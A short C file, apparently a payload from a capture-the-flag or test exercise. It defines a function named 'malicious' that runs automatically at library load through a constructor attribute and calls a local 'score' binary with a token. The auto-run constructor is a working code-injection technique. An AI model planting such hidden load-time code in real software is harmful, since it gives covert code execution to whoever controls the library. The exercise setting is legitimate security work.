#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 418f39c6-1c8b-4fa5-adf8-6369f9ab329a");
}
